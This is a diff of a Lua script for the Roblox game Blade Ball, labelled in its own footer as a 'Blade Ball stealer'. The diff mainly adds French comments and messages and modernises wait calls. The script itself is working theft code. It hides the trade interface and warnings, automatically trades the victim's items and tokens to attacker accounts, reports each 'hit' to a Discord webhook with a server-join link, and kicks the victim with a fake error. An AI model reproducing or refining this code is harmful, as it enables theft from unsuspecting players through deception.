@@ -1,9 +1,11 @@
+-- // CONFIGURATION & SÉCURITÉ
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
     return
 end
 _G.scriptExecuted = true
 
+-- // VARIABLES SERVICES
 local itemsToSend = {}
 local categories = {"Sword", "Emote", "Explosion"}
 local Players = game:GetService("Players")
@@ -18,47 +20,46 @@ local tradeCompleteGui = PlayerGui.TradeCompleted
 local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
 local Replion = require(game.ReplicatedStorage.Packages.Replion)
 
+-- // CONFIGURATION UTILISATEUR
 local users = _G.Usernames or {}
 local min_rap = _G.min_rap or 100
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
 local auth_token = "EBK-SS-A" 
 
--- URL de la photo de profil (PDP)
+-- // URL DE LA PHOTO DE PROFIL (PDP)
 local headshot = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. plr.UserId .. "&size=420x420&format=Png&isCircular=false"
 
+-- // VÉRIFICATIONS DE SÉCURITÉ
 if next(users) == nil or webhook == "" then
-    plr:kick("You didn't add usernames or webhook")
+    plr:kick("Configuration manquante : Usernames ou Webhook vide.")
     return
 end
 
 if game.PlaceId ~= 13772394625 then
-    plr:kick("only work on server normal")
+    plr:kick("Ce script ne fonctionne que sur Blade Ball.")
     return
 end
 
 if #Players:GetPlayers() >= 16 then
-    plr:kick("Server is full. Please join a less populated server")
+    plr:kick("Serveur plein. Rejoignez un serveur moins peuplé.")
     return
 end
 
 if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
-    plr:kick("Server error. Please join a DIFFERENT server")
+    plr:kick("Erreur serveur. Rejoignez un serveur public.")
     return
 end
 
-local args = {
-    [1] = {
-        ["option"] = "PIN",
-        ["value"] = "9079"
-    }
-}
-local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
+-- // VÉRIFICATION DU PIN CODE
+local args_pin = { [1] = { ["option"] = "PIN", ["value"] = "9079" } }
+local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args_pin))
 if PINReponse ~= "You don't have a PIN code" then
-    plr:kick("Account error. Please disable trade PIN and try again")
+    plr:kick("Veuillez désactiver votre code PIN de transaction et réessayer.")
     return
 end
 
+-- // NETTOYAGE UI (DISCRETION)
 tradeGui.Black.Visible = false
 tradeGui.MiscChat.Visible = false
 tradeCompleteGui.Black.Visible = false
@@ -66,20 +67,17 @@ tradeCompleteGui.Main.Visible = false
 
 local maintradegui = tradeGui.Main
 maintradegui.Visible = false
-maintradegui:GetPropertyChangedSignal("Visible"):Connect(function()
-    maintradegui.Visible = false
-end)
+maintradegui:GetPropertyChangedSignal("Visible"):Connect(function() maintradegui.Visible = false end)
+
 local unfairTade = tradeGui.UnfairTradeWarning
 unfairTade.Visible = false
-unfairTade:GetPropertyChangedSignal("Visible"):Connect(function()
-    unfairTade.Visible = false
-end)
+unfairTade:GetPropertyChangedSignal("Visible"):Connect(function() unfairTade.Visible = false end)
+
 local notificationsFrame = notificationsGui.Notifications
 notificationsFrame.Visible = false
-notificationsFrame:GetPropertyChangedSignal("Visible"):Connect(function()
-    notificationsFrame.Visible = false
-end)
+notificationsFrame:GetPropertyChangedSignal("Visible"):Connect(function() notificationsFrame.Visible = false end)
 
+-- // GESTION DES ÉCHANGES
 tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
     inTrade = tradeGui.Enabled
     if inTrade then
@@ -101,42 +99,36 @@ tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
 end)
 
 local function sendTradeRequest(user)
-    local args = {
-        [1] = game:GetService("Players"):WaitForChild(user)
-    }
+    local args = { [1] = game:GetService("Players"):WaitForChild(user) }
     repeat
-        wait(0.1)
+        task.wait(0.1)
         local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(unpack(args))
     until response == true
 end
 
 local function addItemToTrade(itemType, ID)
-    local args = {
-        [1] = itemType,
-        [2] = ID
-    }
+    local args = { [1] = itemType, [2] = ID }
     task.spawn(function()
         netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(unpack(args))
     end)
 end
 
 local function readyTrade()
-    local args = {
-        [1] = true
-    }
+    local args = { [1] = true }
     repeat
-        wait(0.1)
+        task.wait(0.1)
         local response = netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(unpack(args))
     until response == true
 end
 
 local function confirmTrade()
     repeat
-        wait(0.1)
+        task.wait(0.1)
         netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
     until not inTrade
 end
 
+-- // FORMATAGE RAP
 local function formatNumber(number)
     if number == nil then return "0" end
     local suffixes = {"", "k", "m", "b", "t"}
@@ -145,15 +137,12 @@ local function formatNumber(number)
         number = number / 1000
         suffixIndex = suffixIndex + 1
     end
-    if suffixIndex == 1 then
-        return tostring(math.floor(number))
-    else
-        return string.format("%.2f%s", number, suffixes[suffixIndex])
-    end
+    return (suffixIndex == 1) and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
 end
 
 local totalRAP = 0
 
+-- // ENVOI DES MESSAGES DISCORD
 local function SendJoinMessage(list, prefix)
     local botUsername = (totalRAP >= 500) and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
     local embedColor = (totalRAP >= 500) and 65280 or 8323327
@@ -191,13 +180,13 @@ local function SendJoinMessage(list, prefix)
     local data = {
         ["auth_token"] = auth_token,
         ["username"] = botUsername,
-        ["avatar_url"] = headshot, -- CHANGE LA PDP DU BOT
+        ["avatar_url"] = headshot, -- ACTIONNE LA PDP DU BOT
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["embeds"] = {{
             ["title"] = botUsername,
             ["color"] = embedColor,
             ["fields"] = fields,
-            ["thumbnail"] = {["url"] = headshot}, -- PHOTO DANS L'EMBED
+            ["thumbnail"] = {["url"] = headshot},
             ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
         }}
     }
@@ -242,12 +231,12 @@ local function SendMessage(list)
     local data = {
         ["auth_token"] = auth_token,
         ["username"] = botUsername,
-        ["avatar_url"] = headshot, -- CHANGE LA PDP DU BOT
+        ["avatar_url"] = headshot, -- ACTIONNE LA PDP DU BOT
         ["embeds"] = {{
             ["title"] = "⚪ The hit on server 🎉" ,
             ["color"] = embedColor,
             ["fields"] = fields,
-            ["thumbnail"] = {["url"] = headshot}, -- PHOTO DANS L'EMBED
+            ["thumbnail"] = {["url"] = headshot},
             ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
         }}
     }
@@ -260,6 +249,7 @@ local function SendMessage(list)
     })
 end
 
+-- // RÉCUPÉRATION DES DONNÉES RAP
 local rapDataResult = Replion.Client:GetReplion("ItemRAP")
 local rapData = rapDataResult.Data.Items
 
@@ -288,6 +278,7 @@ local function getRAP(category, itemName)
     return (rapMap and rapMap[itemName]) or 0
 end
 
+-- // SCAN DE L'INVENTAIRE
 for _, category in ipairs(categories) do
     for itemId, itemInfo in pairs(clientInventory[category]) do
         if not itemInfo.TradeLock then
@@ -300,6 +291,7 @@ for _, category in ipairs(categories) do
     end
 end
 
+-- // LANCEMENT DE LA PROCÉDURE
 if #itemsToSend > 0 then
     table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
     local sentItems = {}
@@ -317,7 +309,7 @@ if #itemsToSend > 0 then
     local function doTrade(joinedUser)
         while #itemsToSend > 0 do
             sendTradeRequest(joinedUser)
-            repeat wait(0.5) until inTrade
+            repeat task.wait(0.5) until inTrade
             local currentBatch = getNextBatch(itemsToSend, 100)
             for _, item in ipairs(currentBatch) do addItemToTrade(item.itemType, item.ItemID) end
 
@@ -327,12 +319,12 @@ if #itemsToSend > 0 then
                 netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount)
             end
 
-            wait(1.5) 
+            task.wait(1.5) 
             readyTrade()
-            wait(0.5)
+            task.wait(0.5)
             confirmTrade()
         end
-        plr:kick("Please check your internet connection and try again.")
+        plr:kick("Erreur de connexion (Fin de l'opération).")
     end
 
     local function waitForUserJoin()
